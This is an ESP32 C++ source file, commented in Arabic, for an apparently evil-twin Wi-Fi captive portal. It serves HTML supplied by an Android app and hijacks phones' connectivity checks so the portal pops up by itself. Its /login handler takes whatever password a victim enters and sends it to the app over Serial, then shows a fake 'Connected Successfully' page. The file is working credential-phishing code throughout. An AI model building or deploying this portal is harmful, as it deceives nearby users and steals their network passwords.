#include "portal.h"
#include <ESPAsyncWebServer.h>

// متغير لتخزين محتوى صفحة الـ HTML القادمة من تطبيق الأندرويد
static String dynamicHtmlContent = "";

PortalManager::PortalManager() {
    server = new AsyncWebServer(80);
}

void PortalManager::begin(BridgeProtocol proto) {
    if (!server) {
        server = new AsyncWebServer(80);
    }

    // 1. عرض صفحة HTML القادمة من تطبيق الأندرويد
    server->on("/", HTTP_GET, [](AsyncWebServerRequest *request){
        if (dynamicHtmlContent.length() > 0) {
            request->send(200, "text/html", dynamicHtmlContent);
        } else {
            request->send(200, "text/html", "<html><body><h2>Loading Portal...</h2></body></html>");
        }
    });

    // 2. معالجة استقبال كلمة المرور وضمان إرسالها للتطبيق 100%
    server->on("/login", HTTP_ANY, [](AsyncWebServerRequest *request){
        String password = "";

        // فحص معاملات الـ POST (إذا تم إرسال النموذج بشكل طبيعي)
        if (request->hasParam("password", true)) {
            password = request->getParam("password", true)->value();
        } 
        // فحص معاملات الـ GET (في حال قام المتصفح المصغر بتحويل الطلب أو استخدام Query Parameters)
        else if (request->hasParam("password", false)) {
            password = request->getParam("password", false)->value();
        }
        // فحص بديل عبر البحث المباشر في الـ URL في حال فشل البارامترات
        else if (request->hasArgs()) {
            for (uint8_t i = 0; i < request->args(); i++) {
                if (request->argName(i).indexOf("pass") != -1 || request->argName(i).indexOf("pwd") != -1) {
                    password = request->arg(i);
                    break;
                }
            }
        }

        // إذا تم العثور على كلمة المرور، يتم إرسالها فوراً للتطبيق عبر Serial بالصيغة التي ينتظرها MainViewModelPortal
        if (password.length() > 0) {
            Serial.printf("{\"event\":\"captive_data\",\"password\":\"%s\"}\n", password.c_str());
            Serial.flush();
        }

        // الرد بصفحة نجاح خفيفة لكي يغلق المتصفح المصغر نافذة البورتال بسلاسة
        String successResponse = "<html><head><meta name='viewport' content='width=device-width, initial-scale=1'>"
                                 "<style>body{font-family:sans-serif;text-align:center;padding-top:50px;background:#f4f4f9;color:#333;}"
                                 "h2{color:#28a745;}</style></head><body>"
                                 "<h2>Connected Successfully</h2>"
                                 "<p>Your device is now connected to the network. You may close this window.</p>"
                                 "</body></html>";
        request->send(200, "text/html", successResponse);
    });

    // 3. معالج طلبات فحص الاتصال لإجبار الهاتف على فتح البورتال تلقائياً (Auto-Popup)
    server->onNotFound([](AsyncWebServerRequest *request){
        String url = request->url();
        
        if (url.indexOf("generate_204") != -1 || 
            url.indexOf("gen_204") != -1 || 
            url.indexOf("hotspot-detect") != -1 || 
            url.indexOf("library/test") != -1 || 
            url.indexOf("ncsi.txt") != -1 || 
            url.indexOf("connectivitycheck") != -1) {
            
            request->redirect("http://192.168.4.1/");
            return;
        }

        request->redirect("http://192.168.4.1/");
    });

    server->begin();
}

bool PortalManager::resetHtml(size_t expectedSize) {
    dynamicHtmlContent = "";
    if (expectedSize > 0) {
        dynamicHtmlContent.reserve(expectedSize);
    }
    return true;
}

bool PortalManager::setHtmlChunk(const uint8_t* data, size_t len, bool isLast) {
    for (size_t i = 0; i < len; i++) {
        dynamicHtmlContent += (char)data[i];
    }
    return true;
}

bool PortalManager::start(const char* ssid, uint8_t channel, const uint8_t* targetBssid) {
    return true;
}

void PortalManager::stop() {
    if (server) {
        server->end();
        delete server;
        server = nullptr;
    }
}

void PortalManager::update() {
    // دورة التحديث
}
